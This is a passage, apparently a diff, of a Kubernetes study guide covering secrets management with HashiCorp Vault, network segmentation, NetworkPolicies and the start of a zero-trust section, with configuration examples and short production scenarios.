+| Best for | General use | High security | Vault ecosystem |
+
+**Operational considerations:**
+
+**Consideration 1: Bootstrap**
+
+External store must be accessible during pod start. If pod can't reach store, can't get secrets.
+
+Fix: graceful retries, monitoring of external store health.
+
+**Consideration 2: Refresh failures**
+
+If external store unreachable during refresh, ESO logs error but K8s Secret unchanged. Apps continue with old values.
+
+After store recovers, refresh succeeds.
+
+**Consideration 3: Network policies**
+
+Pods need to reach external store:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+spec:
+  egress:
+    - to:
+        - ipBlock:
+            cidr: 10.100.0.0/16   # Vault IPs
+      ports:
+        - port: 8200
+```
+
+**Consideration 4: Audit**
+
+External store has its own audit logs:
+- AWS CloudTrail for SM
+- Vault audit log
+- GCP audit log
+
+Aggregate with K8s audit for complete picture.
+
+**Production scenarios:**
+
+1. **ESO + AWS SM migration**: 200+ K8s Secrets across cluster. Migrated to AWS SM. ESO syncs back to K8s. Apps unchanged. Source of truth in SM with automatic rotation.
+
+2. **Vault dynamic database credentials**: Apps got unique DB credentials per pod, valid 1 hour. After hour, new credentials. If compromised, brief exposure.
+
+3. **CSI for PCI compliance**: PCI required secrets never in K8s. CSI driver mounted from Vault directly. No K8s Secret existed. Audit passed.
+
+4. **Cross-region secret replication**: Primary in us-east-1, DR in us-west-2. AWS SM cross-region replication. DR cluster's ESO pulled from us-west-2. Worked during regional failover.
+
+5. **IRSA simplified authentication**: Previously had AWS keys in K8s Secrets to authenticate to AWS. Used IRSA. K8s SA → AWS IAM. No long-lived keys.
+
+---
+
+## 231. How do you integrate HashiCorp Vault?
+
+HashiCorp Vault is the most feature-rich secrets manager. Integration with Kubernetes offers powerful capabilities beyond simple secret storage.
+
+**Vault capabilities:**
+
+- **Static secrets**: store passwords, API keys
+- **Dynamic secrets**: generate per-use credentials (DB, AWS, etc.)
+- **Encryption as a service**: encrypt/decrypt without managing keys
+- **PKI**: certificate issuance
+- **SSH**: SSH access management
+- **Identity**: identity federation
+
+**Integration architectures:**
+
+**Architecture 1: Vault outside cluster**
+
+```
+Vault Cluster (3 nodes, dedicated)
+       ↑
+   Cluster pods authenticate and fetch
+```
+
+Vault separate from Kubernetes. Multiple clusters can use same Vault.
+
+Pros: independent failure domain, multi-cluster support
+Cons: network dependency
+
+**Architecture 2: Vault in cluster**
+
+```
+Kubernetes Cluster
+  ├─ Vault StatefulSet (3 pods)
+  └─ Application pods
+```
+
+Vault runs as workload in cluster.
+
+Pros: simpler, local
+Cons: shared failure domain
+
+**Architecture 3: Vault Enterprise with namespaces**
+
+Vault Enterprise supports multi-tenancy:
+
+```
+Vault (central)
+  ├─ Namespace: team-a
+  ├─ Namespace: team-b
+  └─ Namespace: team-c
+```
+
+Different teams isolated within same Vault.
+
+**Installing Vault:**
+
+**Self-managed:**
+
+```yaml
+# Helm:
+helm install vault hashicorp/vault \
+  --set='server.ha.enabled=true' \
+  --set='server.ha.replicas=3' \
+  --set='server.dataStorage.size=10Gi'
+```
+
+**Initialize and unseal:**
+
+```bash
+# Initialize (only first time):
+kubectl exec vault-0 -- vault operator init
+
+# Output: 5 unseal keys, 1 root token
+# CRITICAL: backup these securely
+
+# Unseal each pod:
+kubectl exec vault-0 -- vault operator unseal <key1>
+kubectl exec vault-0 -- vault operator unseal <key2>
+kubectl exec vault-0 -- vault operator unseal <key3>
+
+# Repeat for vault-1, vault-2
+```
+
+**Auto-unseal (recommended):**
+
+```yaml
+# Vault config:
+seal "awskms" {
+  region     = "us-east-1"
+  kms_key_id = "alias/vault-unseal"
+}
+```
+
+KMS unseal Vault automatically on restart. Production essential.
+
+**Kubernetes authentication:**
+
+Configure Vault to trust Kubernetes:
+
+```bash
+# Enable K8s auth:
+vault auth enable kubernetes
+
+# Configure:
+vault write auth/kubernetes/config \
+  kubernetes_host="https://kubernetes.default.svc" \
+  token_reviewer_jwt="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+  kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+```
+
+Now Vault verifies K8s SA tokens.
+
+**Create Vault role:**
+
+```bash
+vault write auth/kubernetes/role/my-app \
+  bound_service_account_names=my-app \
+  bound_service_account_namespaces=production \
+  policies=my-app-policy \
+  ttl=1h
+```
+
+The SA `production/my-app` can authenticate to Vault with policy `my-app-policy`.
+
+**Create policy:**
+
+```hcl
+# my-app-policy.hcl:
+path "secret/data/my-app/*" {
+  capabilities = ["read"]
+}
+```
+
+```bash
+vault policy write my-app-policy my-app-policy.hcl
+```
+
+Policy grants read on specific path.
+
+**Vault Agent Injector:**
+
+Auto-injects Vault sidecar:
+
+```yaml
+# Install:
+helm install vault hashicorp/vault \
+  --set "injector.enabled=true"
+```
+
+**Pod annotations trigger injection:**
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: my-app
+spec:
+  template:
+    metadata:
+      annotations:
+        vault.hashicorp.com/agent-inject: "true"
+        vault.hashicorp.com/role: "my-app"
+        vault.hashicorp.com/agent-inject-secret-config: "secret/data/my-app/config"
+    spec:
+      serviceAccountName: my-app
+      containers:
+        - name: app
+          image: my-app:v1
+```
+
+What happens:
+1. Injector mutating webhook adds Vault agent sidecar
+2. Vault agent authenticates to Vault (using SA token)
+3. Vault verifies token, returns Vault token + secrets
+4. Vault agent writes secrets to shared volume `/vault/secrets/config`
+5. App reads from file
+6. Agent refreshes before token expires
+
+**Template files:**
+
+```yaml
+annotations:
+  vault.hashicorp.com/agent-inject-template-config: |
+    {{- with secret "secret/data/my-app/db" -}}
+    DB_HOST={{ .Data.data.host }}
+    DB_PASSWORD={{ .Data.data.password }}
+    {{- end }}
+```
+
+Outputs file with env-like format. App can `source` it.
+
+**Dynamic secrets:**
+
+Most powerful Vault feature. Generate credentials per-use:
+
+**Database secrets engine:**
+
+```bash
+# Configure DB connection:
+vault secrets enable database
+vault write database/config/my-postgres \
+  plugin_name=postgresql-database-plugin \
+  connection_url="postgresql://{{username}}:{{password}}@postgres:5432/postgres" \
+  allowed_roles="my-app" \
+  username=vault-admin \
+  password=password
+
+# Create role:
+vault write database/roles/my-app \
+  db_name=my-postgres \
+  creation_statements="CREATE ROLE \"{{name}}\" WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}';
+    GRANT SELECT ON ALL TABLES IN SCHEMA public TO \"{{name}}\";" \
+  default_ttl=1h \
+  max_ttl=24h
+```
+
+**Pod requests credentials:**
+
+```yaml
+annotations:
+  vault.hashicorp.com/agent-inject-secret-db: "database/creds/my-app"
+```
+
+Vault generates new DB user/password every hour. Database has temporary user with limited permissions.
+
+Benefits:
+- Each pod gets unique credentials
+- Credentials expire automatically
+- If leaked, brief exposure
+- Audit shows which pod used which credential
+
+**Cloud secrets engines:**
+
+Generate cloud credentials on demand:
+
+**AWS:**
+
+```bash
+vault secrets enable aws
+vault write aws/config/root \
+  access_key=AKIA... \
+  secret_key=...
+
+vault write aws/roles/my-app \
+  credential_type=iam_user \
+  policy_document=-<<EOF
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": "s3:*",
+    "Resource": "arn:aws:s3:::my-bucket/*"
+  }]
+}
+EOF
+```
+
+Pod gets temporary AWS credentials with specific policy.
+
+**PKI:**
+
+Generate TLS certificates:
+
+```bash
+vault secrets enable pki
+vault write pki/root/generate/internal \
+  common_name="internal-ca" \
+  ttl=8760h
+
+vault write pki/roles/my-app \
+  allowed_domains="my-app.example.com" \
+  allow_subdomains=true \
+  max_ttl=720h
+```
+
+Pod requests certificate for its hostname, Vault issues one.
+
+**Vault Secrets Operator (alternative to Agent):**
+
+Newer integration similar to ESO:
+
+```yaml
+apiVersion: secrets.hashicorp.com/v1beta1
+kind: VaultStaticSecret
+metadata:
+  name: my-secret
+spec:
+  type: kv-v2
+  mount: secret
+  path: my-app/config
+  destination:
+    name: my-app-config
+    create: true
+  refreshAfter: 30s
+```
+
+Creates K8s Secret from Vault.
+
+**Operational considerations:**
+
+**Consideration 1: Vault HA**
+
+Vault must be HA:
+- 3+ replicas with Raft storage
+- Leader election
+- Cross-AZ deployment
+
+**Consideration 2: Backup**
+
+```bash
+# Vault snapshot:
+vault operator raft snapshot save backup.snap
+
+# Scheduled via CronJob
+```
+
+Critical for recovery.
+
+**Consideration 3: Performance**
+
+Heavy use of Vault adds latency:
+- Agent caches secrets
+- Connection pooling
+- Vault performance tuning
+
+**Consideration 4: Secret rotation**
+
+Vault doesn't auto-rotate static secrets. Combine with:
+- App-aware rotation
+- Migration to dynamic secrets
+
+**Consideration 5: Disaster recovery**
+
+Vault loss = no secrets:
+- HA + backups
+- DR replica in another region
+- Auto-unseal in DR
+
+**Vault for Kubernetes patterns:**
+
+**Pattern 1: KV secrets**
+
+Replace K8s Secrets:
+
+```bash
+vault kv put secret/my-app/db username=admin password=secret
+```
+
+Vault Agent or VSO syncs to pod.
+
+**Pattern 2: Dynamic database credentials**
+
+Each pod gets unique DB user, expires quickly.
+
+**Pattern 3: Cloud credentials**
+
+Pods get temporary cloud access. No static keys.
+
+**Pattern 4: Encryption as a Service**
+
+App calls Vault for encrypt/decrypt:
+
+```bash
+# Encrypt:
+vault write transit/encrypt/my-app plaintext=$(base64 <<< "sensitive data")
+
+# Decrypt:
+vault write transit/decrypt/my-app ciphertext=vault:v1:...
+```
+
+Keys never leave Vault. App doesn't manage keys.
+
+**Pattern 5: Multi-cluster secrets**
+
+Single Vault for multiple clusters:
+- Same secrets accessible everywhere
+- Centralized audit
+- Single source of truth
+
+**Production scenarios:**
+
+1. **Vault Agent for all apps**: Standardized on Vault Agent injection. Apps got secrets via files. Rotation automatic. Worked for diverse stack.
+
+2. **Dynamic DB credentials**: All app database access via Vault dynamic secrets. Compromised pod = 1-hour credentials. Database admin user not exposed to apps.
+
+3. **Vault for PKI**: Internal PKI in Vault. Apps requested certificates per service. Cert-manager + Vault integration. Auto-renewal.
+
+4. **Vault HA across regions**: Vault Enterprise with replication. Primary in us-east-1, DR replica in us-west-2. Failover for regional issue.
+
+5. **Migration from K8s Secrets**: Audit showed 500+ K8s Secrets. Migrated to Vault. ESO/VSO synced back. Source of truth in Vault.
+
+---
+
+## 232. Explain network segmentation in Kubernetes
+
+Network segmentation isolates workloads to limit lateral movement during a breach. Without segmentation, one compromised pod can reach any pod.
+
+**Default Kubernetes networking:**
+
+```
+Pod A → can reach → Pod B (any namespace, any cluster)
+```
+
+Flat network model. All pods can communicate by default.
+
+**Why segmentation matters:**
+
+Breach scenario:
+1. Attacker compromises one pod (via app vulnerability)
+2. Without segmentation: reaches all other pods
+3. With segmentation: blocked at namespace/pod boundaries
+
+Reduces blast radius.
+
+**Segmentation layers:**
+
+**Layer 1: Namespaces**
+
+Logical grouping:
+
+```yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: production
+---
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: dev
+```
+
+Without NetworkPolicies, namespaces don't actually segment network. They're just organizational.
+
+**Layer 2: NetworkPolicies**
+
+Actual network segmentation:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+    - Egress
+```
+
+Default-deny: no traffic in or out unless explicitly allowed.
+
+Then allow specific traffic:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-frontend-to-backend
+  namespace: production
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  policyTypes:
+    - Ingress
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: frontend
+      ports:
+        - protocol: TCP
+          port: 8080
+```
+
+Backend only accepts traffic from frontend on port 8080.
+
+**Layer 3: Service mesh**
+
+Encryption and mutual TLS:
+
+```yaml
+# Istio AuthorizationPolicy:
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: deny-all
+  namespace: production
+spec:
+  {}   # Default deny
+
+---
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: allow-frontend
+  namespace: production
+spec:
+  selector:
+    matchLabels:
+      app: backend
+  action: ALLOW
+  rules:
+    - from:
+        - source:
+            principals: ["cluster.local/ns/production/sa/frontend"]
+```
+
+Identity-based access (not just network):
+- Workload identities verified via mTLS
+- Per-service authorization
+- Encrypted in transit
+
+**Layer 4: Physical network**
+
+Cloud VPC segmentation:
+- Subnets per environment
+- Security groups
+- Cloud-level firewalls
+
+Less common but used for strong isolation.
+
+**NetworkPolicy patterns:**
+
+**Pattern 1: Default-deny namespace**
+
+```yaml
+# In every namespace:
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+    - Egress
+```
+
+Then add specific allows. Most secure.
+
+**Pattern 2: Tier-based**
+
+```yaml
+# Frontend → backend → database
+
+# Backend accepts only from frontend:
+spec:
+  podSelector:
+    matchLabels:
+      tier: backend
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              tier: frontend
+
+# Database accepts only from backend:
+spec:
+  podSelector:
+    matchLabels:
+      tier: database
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              tier: backend
+```
+
+Tier-by-tier traffic.
+
+**Pattern 3: Per-app**
+
+```yaml
+# Each app has its own policy:
+spec:
+  podSelector:
+    matchLabels:
+      app: my-app
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: caller-app
+```
+
+Fine-grained, but more policies to manage.
+
+**Pattern 4: Namespace isolation**
+
+```yaml
+# Allow only same-namespace traffic:
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: same-namespace-only
+spec:
+  podSelector: {}
+  policyTypes: [Ingress]
+  ingress:
+    - from:
+        - namespaceSelector:
+            matchLabels:
+              name: my-namespace
+```
+
+Other namespaces blocked.
+
+**Pattern 5: Allow specific external**
+
+```yaml
+# Allow egress to specific external services:
+spec:
+  podSelector:
+    matchLabels:
+      app: my-app
+  policyTypes: [Egress]
+  egress:
+    - to:
+        - ipBlock:
+            cidr: 10.100.0.0/16   # Internal database CIDR
+        - ipBlock:
+            cidr: 0.0.0.0/0
+            except:
+              - 10.0.0.0/8   # Internal network
+        # External (anywhere except internal)
+      ports:
+        - port: 443   # HTTPS only
+```
+
+Egress controls.
+
+**Pattern 6: DNS allowed**
+
+```yaml
+# Most pods need DNS:
+egress:
+  - to:
+      - namespaceSelector:
+          matchLabels:
+            name: kube-system
+        podSelector:
+          matchLabels:
+            k8s-app: kube-dns
+    ports:
+      - protocol: UDP
+        port: 53
+```
+
+Without this, pods can't resolve DNS.
+
+**CNI requirements:**
+
+Not all CNIs support NetworkPolicy:
+
+**Supports NetworkPolicy:**
+- Calico
+- Cilium
+- Weave Net
+- Antrea
+- Kube-router
+
+**Doesn't support:**
+- Flannel (without separate enforcer)
+- Some basic CNIs
+
+Choose CNI based on policy needs.
+
+**Calico:**
+
+Standard NetworkPolicy + extensions:
+- Global NetworkPolicies
+- Egress gateways
+- DNS-based policies
+
+```yaml
+apiVersion: projectcalico.org/v3
+kind: GlobalNetworkPolicy
+metadata:
+  name: deny-all
+spec:
+  selector: all()
+  types:
+    - Ingress
+    - Egress
+```
+
+**Cilium:**
+
+eBPF-based, very fast. Extensions:
+- L7 policies (HTTP, gRPC)
+- DNS-based policies
+- Identity-based
+
+```yaml
+apiVersion: cilium.io/v2
+kind: CiliumNetworkPolicy
+metadata:
+  name: l7-policy
+spec:
+  endpointSelector:
+    matchLabels:
+      app: my-app
+  ingress:
+    - fromEndpoints:
+        - matchLabels:
+            app: caller
+      toPorts:
+        - ports:
+            - port: "8080"
+              protocol: TCP
+          rules:
+            http:
+              - method: "GET"
+                path: "/api/.*"
+```
+
+HTTP-level: only GET to /api/* allowed.
+
+**Service mesh segmentation:**
+
+mTLS adds another layer:
+
+```yaml
+# Istio PeerAuthentication:
+apiVersion: security.istio.io/v1beta1
+kind: PeerAuthentication
+metadata:
+  name: default
+spec:
+  mtls:
+    mode: STRICT
+```
+
+All in-mesh traffic encrypted, mutual authentication.
+
+```yaml
+# Plus AuthorizationPolicy:
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: api-auth
+spec:
+  selector:
+    matchLabels:
+      app: api
+  rules:
+    - from:
+        - source:
+            principals: ["cluster.local/ns/production/sa/web"]
+      to:
+        - operation:
+            methods: ["GET", "POST"]
+            paths: ["/api/v1/*"]
+```
+
+Cryptographically verified workload identity, fine-grained permissions.
+
+**Multi-cluster segmentation:**
+
+For multi-cluster:
+- Cilium Cluster Mesh: pod-to-pod across clusters
+- Istio multi-cluster: mesh spans clusters
+- Submariner: cross-cluster networking with policies
+
+**Common challenges:**
+
+**Challenge 1: DNS issues**
+
+Default-deny breaks DNS. Always allow DNS egress.
+
+**Challenge 2: Egress to external**
+
+Apps need to reach databases, APIs. Easy to over-allow:
+
+```yaml
+# Bad: allow all external:
+egress:
+  - to:
+      - ipBlock:
+          cidr: 0.0.0.0/0
+```
+
+Better: specific IPs/CIDRs.
+
+**Challenge 3: Policy debugging**
+
+Why is traffic blocked?
+
+```bash
+# Cilium hubble:
+hubble observe --pod my-pod --verdict DROPPED
+
+# Calico:
+calicoctl get networkpolicies -o yaml
+```
+
+Tools help understand drops.
+
+**Challenge 4: Policy sprawl**
+
+Many policies, hard to reason about.
+
+Fix:
+- Hierarchical (global, namespace, app)
+- Naming conventions
+- Documentation
+- Automation (generate from app config)
+
+**Challenge 5: Performance**
+
+Many rules per pod can impact performance.
+
+- iptables-based: linear scan
+- eBPF: hash table lookups (faster)
+
+Choose CNI accordingly.
+
+**Production scenarios:**
+
+1. **Default-deny adopted**: New cluster started with default-deny everywhere. Required explicit allows. Initially friction, but secure by default.
+
+2. **Calico for advanced policies**: Migrated from Flannel to Calico for NetworkPolicy support. Gained ability to segment workloads.
+
+3. **Cilium L7 policies**: Standard NetworkPolicies were L3/L4. Adopted Cilium for L7 (HTTP path, gRPC method) controls. Tighter API gateway policies.
+
+4. **Service mesh added beyond NetworkPolicy**: NetworkPolicy was L3/L4. Istio added mTLS encryption + identity-based authorization. Defense in depth.
+
+5. **Multi-tenant cluster needed segmentation**: Multiple teams shared cluster. Per-namespace default-deny + explicit allows. Compromise of one team's workload couldn't reach others.
+
+---
+
+## 233. What are NetworkPolicies?
+
+NetworkPolicies are Kubernetes resources that control network traffic between pods, namespaces, and external endpoints. They're the primary mechanism for network segmentation.
+
+**Without NetworkPolicies:**
+
+Default Kubernetes: all pods can communicate with all pods. Flat, open network.
+
+**With NetworkPolicies:**
+
+Traffic restricted based on labels, selectors, and rules.
+
+**Basic structure:**
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: my-policy
+  namespace: production
+spec:
+  podSelector:
+    matchLabels:
+      app: my-app   # Applies to pods with this label
+  policyTypes:
+    - Ingress
+    - Egress
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: trusted-caller
+      ports:
+        - protocol: TCP
+          port: 8080
+  egress:
+    - to:
+        - podSelector:
+            matchLabels:
+              app: database
+      ports:
+        - protocol: TCP
+          port: 5432
+```
+
+**Components:**
+
+**podSelector:** which pods this policy applies to. `{}` means all pods in namespace.
+
+**policyTypes:** Ingress, Egress, or both.
+
+**ingress:** incoming traffic rules. If no rules, all ingress denied.
+
+**egress:** outgoing traffic rules. If no rules, all egress denied.
+
+**Rule structure:**
+
+Each rule has `from`/`to` and `ports`.
+
+**from/to selectors:**
+
+```yaml
+# By pod label:
+- podSelector:
+    matchLabels:
+      app: my-app
+
+# By namespace:
+- namespaceSelector:
+    matchLabels:
+      environment: prod
+
+# Combination (pod in specific namespace):
+- namespaceSelector:
+    matchLabels:
+      environment: prod
+  podSelector:
+    matchLabels:
+      app: my-app
+
+# IP block:
+- ipBlock:
+    cidr: 10.0.0.0/8
+    except:
+      - 10.10.10.0/24
+```
+
+**Ports:**
+
+```yaml
+ports:
+  - protocol: TCP
+    port: 80
+  - protocol: TCP
+    port: 443
+  - protocol: UDP
+    port: 53
+```
+
+**Default-deny:**
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+  namespace: production
+spec:
+  podSelector: {}   # All pods
+  policyTypes:
+    - Ingress
+    - Egress
+  # No rules = deny all
+```
+
+After this, pods in `production` can't communicate at all (not even DNS).
+
+Then explicitly allow:
+
+```yaml
+# Allow DNS:
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-dns
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: kube-system
+          podSelector:
+            matchLabels:
+              k8s-app: kube-dns
+      ports:
+        - protocol: UDP
+          port: 53
+```
+
+**Common policies:**
+
+**Allow only within namespace:**
+
+```yaml
+spec:
+  podSelector: {}
+  policyTypes: [Ingress]
+  ingress:
+    - from:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: production
+```
+
+Pods only accept traffic from same namespace.
+
+**Allow specific external CIDR:**
+
+```yaml
+spec:
+  podSelector:
+    matchLabels:
+      app: my-app
+  policyTypes: [Ingress]
+  ingress:
+    - from:
+        - ipBlock:
+            cidr: 192.168.0.0/16
+      ports:
+        - port: 8080
+```
+
+Only from internal IP range.
+
+**Allow ingress from specific apps:**
+
+```yaml
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  policyTypes: [Ingress]
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: frontend
+        - podSelector:
+            matchLabels:
+              app: api-gateway
+      ports:
+        - port: 8080
+```
+
+Multiple allowed sources.
+
+**Egress to external services:**
+
+```yaml
+spec:
+  podSelector:
+    matchLabels:
+      app: my-app
+  policyTypes: [Egress]
+  egress:
+    # DNS:
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: kube-system
+      ports:
+        - protocol: UDP
+          port: 53
+    # Internal services:
+    - to:
+        - namespaceSelector: {}
+      ports:
+        - port: 8080
+    # External HTTPS:
+    - to:
+        - ipBlock:
+            cidr: 0.0.0.0/0
+            except:
+              - 10.0.0.0/8
+              - 172.16.0.0/12
+              - 192.168.0.0/16
+      ports:
+        - port: 443
+```
+
+DNS + internal cluster + external HTTPS allowed.
+
+**Block specific traffic:**
+
+NetworkPolicies are allow-list. To "block" something, you don't include it.
+
+**Multiple policies:**
+
+Multiple NetworkPolicies are additive. Each policy adds allowed traffic.
+
+```yaml
+# Policy 1: allow from frontend:
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: frontend
+
+# Policy 2: allow from admin:
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: admin
+```
+
+Backend now accepts from frontend OR admin.
+
+**NetworkPolicy limitations:**
+
+**Limitation 1: L3/L4 only**
+
+Standard NetworkPolicies operate at network/transport layer:
+- IP addresses
+- TCP/UDP ports
+
+Can't:
+- Inspect HTTP paths
+- Check headers
+- Authorize by JWT
+
+For L7: service mesh or Cilium NetworkPolicy.
+
+**Limitation 2: No source rewriting**
+
+NetworkPolicies see the original source IP. If traffic comes through a LoadBalancer that SNATs, source IP is LB, not original client.
+
+Use `externalTrafficPolicy: Local` to preserve source IP.
+
+**Limitation 3: Egress to FQDN**
+
+Standard NetworkPolicy doesn't support hostnames:
+
+```yaml
+# Not possible:
+egress:
+  - to:
+      - host: api.example.com
+```
+
+You need IP addresses or CIDR blocks.
+
+Cilium has FQDN policies as extension.
+
+**Limitation 4: CNI support**
+
+Not all CNIs enforce NetworkPolicy:
+- Calico, Cilium, Antrea, Weave: yes
+- Flannel: no (needs add-on)
+
+Verify your CNI.
+
+**Cilium NetworkPolicy extensions:**
+
+```yaml
+apiVersion: cilium.io/v2
+kind: CiliumNetworkPolicy
+metadata:
+  name: l7-policy
+spec:
+  endpointSelector:
+    matchLabels:
+      app: api
+  ingress:
+    - fromEndpoints:
+        - matchLabels:
+            app: web
+      toPorts:
+        - ports:
+            - port: "8080"
+              protocol: TCP
+          rules:
+            http:
+              - method: "GET"
+                path: "/api/v1/.*"
+```
+
+L7 policy: only GET to /api/v1/* allowed.
+
+**FQDN policies:**
+
+```yaml
+apiVersion: cilium.io/v2
+kind: CiliumNetworkPolicy
+spec:
+  endpointSelector:
+    matchLabels:
+      app: my-app
+  egress:
+    - toFQDNs:
+        - matchName: "api.github.com"
+        - matchPattern: "*.amazonaws.com"
+      toPorts:
+        - ports:
+            - port: "443"
+              protocol: TCP
+```
+
+Allow egress to specific hostnames.
+
+**Debugging NetworkPolicies:**
+
+**Cilium Hubble:**
+
+```bash
+hubble observe --pod my-pod
+# Shows allowed/dropped traffic
+
+hubble observe --verdict DROPPED
+# Just dropped packets
+```
+
+**Calico:**
+
+```bash
+calicoctl get networkpolicies -A
+calicoctl get globalnetworkpolicies
+```
+
+**Generic:**
+
+```bash
+# Test connectivity:
+kubectl exec test-pod -- curl http://target-service:8080
+
+# If blocked, check policies:
+kubectl get networkpolicies -A
+kubectl describe networkpolicy <name>
+```
+
+**Common debugging issues:**
+
+**Issue 1: DNS broken**
+
+After default-deny, no DNS. Symptoms: name resolution fails.
+
+Fix: allow DNS egress.
+
+**Issue 2: Liveness/readiness probes failing**
+
+Kubelet probes come from node, not pod.
+
+Fix: allow ingress from node IPs or use exec probes.
+
+**Issue 3: External services unreachable**
+
+Strict egress blocks legitimate destinations.
+
+Fix: allow specific external CIDRs/ports.
+
+**Issue 4: Policy not enforced**
+
+CNI doesn't support NetworkPolicy. Or wrong selector.
+
+Fix: verify CNI, check labels match.
+
+**Policy organization:**
+
+**Per-application:**
+
+Each app has its own NetworkPolicy.
+
+```yaml
+# my-app-network-policy.yaml
+# Maintained with the app's manifests
+```
+
+**Per-namespace:**
+
+```yaml
+# default-deny + common allows per namespace
+```
+
+**Global (Calico):**
+
+```yaml
+apiVersion: projectcalico.org/v3
+kind: GlobalNetworkPolicy
+spec:
+  selector: all()
+  types: [Ingress, Egress]
+```
+
+Applies cluster-wide.
+
+**Combination:**
+
+- Global default-deny
+- Namespace-level common rules
+- Per-app specific rules
+
+**Production scenarios:**
+
+1. **Default-deny adoption**: Started with no policies. Mid-2023, adopted default-deny in all namespaces. Audited what broke, added allows. Took 2 months. Significantly better security.
+
+2. **DNS allowed but forgot kube-system**: Default-deny in app namespace. Allowed DNS to kube-dns but forgot namespaceSelector. DNS broke. Added namespace selector.
+
+3. **Cilium for FQDN policies**: Apps called external APIs (GitHub, AWS). Couldn't allowlist IPs (changing). Used Cilium FQDN policies. Allowed by hostname.
+
+4. **L7 policy for API gateway**: API gateway only forwarded specific paths. Used Cilium L7 NetworkPolicy. Even compromised backend couldn't reach other paths.
+
+5. **Debugging stuck pod**: Pod couldn't connect to database. NetworkPolicy debugging showed missing egress to DB namespace. Added rule.
+
+---
+
+## 234. How do you implement zero-trust in Kubernetes?
+
+Zero-trust assumes no implicit trust based on network location. Every connection must be authenticated and authorized. Implementing in Kubernetes requires multiple components.
+
+**Zero-trust principles:**
+
+1. **Never trust, always verify**: every request authenticated
+2. **Least privilege access**: minimum needed permissions
+3. **Assume breach**: design as if attackers already inside
+4. **Verify explicitly**: check identity, device, context
+
+**Traditional security vs. zero-trust:**
+
+**Traditional (perimeter-based):**
+- Inside network = trusted
+- Outside = untrusted
+- Firewall protects boundary
+
+**Zero-trust:**
+- No "inside" trust
+- Every connection verified
+- Identity-based, not network-based
+
+In Kubernetes context:
+- Pod-to-pod traffic not implicitly trusted
+- Service identity verified
+- Authorization explicit
+
+**Implementing zero-trust:**
+
+**Component 1: Workload identity**
+
+Each pod needs strong identity:
+
+```yaml
+# Service account per workload:
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: my-app
+  namespace: production
+```
+
+Service mesh provides cryptographic identity:
+
+```
+Pod's identity: cluster.local/ns/production/sa/my-app
+```
+
+Verified via SPIFFE certificates.
+
+**Component 2: Mutual TLS (mTLS)**
+
+Every connection encrypted and mutually authenticated:
+
+```yaml
+# Istio:
+apiVersion: security.istio.io/v1beta1
+kind: PeerAuthentication
+metadata:
+  name: default
+  namespace: production
+spec:
+  mtls:
+    mode: STRICT
+```
+
+Both sides verify each other via certs. Encryption automatic.
+
+**Component 3: Authorization policies**
+
+After authentication, explicit authorization:
+
+```yaml
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  name: backend-policy
+  namespace: production
+spec:
+  selector:
+    matchLabels:
+      app: backend
+  action: ALLOW
+  rules:
+    - from:
+        - source:
+            principals: ["cluster.local/ns/production/sa/frontend"]
+      to:
+        - operation:
+            methods: ["GET", "POST"]
+            paths: ["/api/v1/*"]
+```
+
+Only frontend SA can call backend's `/api/v1/*` with GET or POST.
+
+**Component 4: Network policies**
+
+L3/L4 segmentation as defense in depth:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: backend-network
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  policyTypes: [Ingress]
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: frontend
+      ports:
+        - port: 8080
+```
+
+Network-level allow, identity-level allow. Both must permit.
+
+**Component 5: Service-to-service authentication**
+
+For HTTP services:
+
+```yaml
+# Istio JWT authentication:
+apiVersion: security.istio.io/v1beta1
+kind: RequestAuthentication
+metadata:
+  name: jwt-auth
+spec:
